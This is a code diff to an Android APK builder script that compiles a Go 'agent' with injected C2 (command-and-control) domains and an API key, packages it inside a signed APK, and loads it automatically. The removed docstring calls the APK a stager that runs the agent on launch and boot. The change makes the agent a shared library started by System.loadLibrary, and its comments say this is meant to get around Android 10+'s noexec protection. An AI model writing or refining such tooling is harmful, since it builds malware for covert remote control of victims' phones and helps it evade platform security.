@@ -2,11 +2,12 @@
 """
 build_android.py — Android APK builder
 
-Compiles the Go agent for Android arm64, injects C2 config,
+Compiles the Go agent as a C shared library for Android, injects C2 config,
 packages it as a native library inside an APK, and signs it.
 
-The APK itself acts as the stager: Java service extracts and runs
-the Go binary (libagent.so) automatically on launch + boot.
+The APK loads the Go agent via System.loadLibrary("agent") which triggers
+Go's init() to start the agent in a background goroutine. This avoids
+Android 10+'s W^X (noexec) enforcement on app data directories.
 
 Usage:
   python3 build_android.py
@@ -184,7 +185,12 @@ def _ndk_cc(ndk_path, arch, api_level=23):
 # ============================================================
 
 def compile_agent(domain1, domain2, apikey, arch="arm64"):
-    """Compile Go agent for Android with config injected."""
+    """Compile Go agent as a C shared library (.so) for Android with config injected.
+
+    Uses -buildmode=c-shared so the agent is loaded via System.loadLibrary()
+    instead of being executed as a standalone binary. This avoids Android 10+'s
+    W^X (noexec) enforcement on the data partition.
+    """
 
     log(f"Reading agent source: {AGENT_SRC}")
     with open(AGENT_SRC, "r") as f:
@@ -217,35 +223,34 @@ def compile_agent(domain1, domain2, apikey, arch="arm64"):
     goarch_map = {"arm64": "arm64", "arm": "arm", "x86_64": "amd64", "x86": "386"}
     goarch = goarch_map.get(arch, "arm64")
 
-    out_path = os.path.join(tmpdir, "agent")
+    # c-shared produces a .so directly
+    out_path = os.path.join(tmpdir, "libagent.so")
+
+    # c-shared buildmode requires CGO + NDK cross-compiler for ALL architectures
+    ndk_path = find_ndk()
+    if not ndk_path:
+        log(f"Android NDK required for c-shared build ({arch}) but not found.", "ERR")
+        log("Install NDK via Android Studio SDK Manager, or:", "ERR")
+        log("  sdkmanager --install ndk-bundle", "ERR")
+        log("  Or set ANDROID_NDK_HOME env var", "ERR")
+        sys.exit(1)
+    cc = _ndk_cc(ndk_path, arch)
+    if not cc:
+        log(f"NDK cross-compiler not found for {arch} in {ndk_path}", "ERR")
+        sys.exit(1)
+
     env = {
         "GOOS": "android",
         "GOARCH": goarch,
-        "CGO_ENABLED": "0",
+        "CGO_ENABLED": "1",
+        "CC": cc,
     }
+    if arch == "arm":
+        env["GOARM"] = "7"
+    log(f"Using NDK cross-compiler for {arch}")
 
-    # 32-bit Android targets (arm, x86) require CGO with NDK cross-compiler
-    needs_cgo = arch in ("arm", "x86")
-    if needs_cgo:
-        ndk_path = find_ndk()
-        if not ndk_path:
-            log(f"Android NDK required for 32-bit ({arch}) build but not found.", "ERR")
-            log("Install NDK via Android Studio SDK Manager, or:", "ERR")
-            log("  sdkmanager --install ndk-bundle", "ERR")
-            log("  Or set ANDROID_NDK_HOME env var", "ERR")
-            sys.exit(1)
-        cc = _ndk_cc(ndk_path, arch)
-        if not cc:
-            log(f"NDK cross-compiler not found for {arch} in {ndk_path}", "ERR")
-            sys.exit(1)
-        env["CGO_ENABLED"] = "1"
-        env["CC"] = cc
-        if arch == "arm":
-            env["GOARM"] = "7"
-        log(f"Using NDK cross-compiler for {arch} (CGO)")
-
-    log(f"Compiling Go agent for android/{goarch}...")
-    run(f'go build -trimpath -ldflags="-s -w" -o "{out_path}" .',
+    log(f"Compiling Go agent as shared library for android/{goarch}...")
+    run(f'go build -buildmode=c-shared -trimpath -ldflags="-s -w" -o "{out_path}" .',
         cwd=tmpdir, env=env)
 
     size = os.path.getsize(out_path)
@@ -507,24 +512,16 @@ def main():
             log(f"Invalid architecture: {a}. Valid: {', '.join(sorted(valid_archs))}", "ERR")
             sys.exit(1)
 
-    # Check NDK availability for 32-bit targets early
-    needs_ndk = any(a in ("arm", "x86") for a in archs)
-    if needs_ndk:
-        ndk_path = find_ndk()
-        if not ndk_path:
-            log("32-bit targets (arm/x86) require the Android NDK.", "WARN")
-            log("Install via: Android Studio > SDK Manager > SDK Tools > NDK", "WARN")
-            log("Or: sdkmanager --install ndk-bundle", "WARN")
-            # Fall back to 64-bit only
-            archs_64 = [a for a in archs if a not in ("arm", "x86")]
-            if archs_64:
-                log(f"Falling back to 64-bit only: {', '.join(archs_64)}", "WARN")
-                archs = archs_64
-            else:
-                log("No valid architectures remaining. Install NDK or use --arch arm64", "ERR")
-                sys.exit(1)
-        else:
-            log(f"Android NDK found: {ndk_path}", "OK")
+    # NDK is required for all architectures (c-shared buildmode needs CGO)
+    ndk_path = find_ndk()
+    if not ndk_path:
+        log("Android NDK is required to build the agent shared library.", "ERR")
+        log("Install via: Android Studio > SDK Manager > SDK Tools > NDK", "ERR")
+        log("Or: sdkmanager --install ndk-bundle", "ERR")
+        log("Or set ANDROID_NDK_HOME env var", "ERR")
+        sys.exit(1)
+    else:
+        log(f"Android NDK found: {ndk_path}", "OK")
 
     log(f"C2 Domain: {domain1}")
     if domain2:
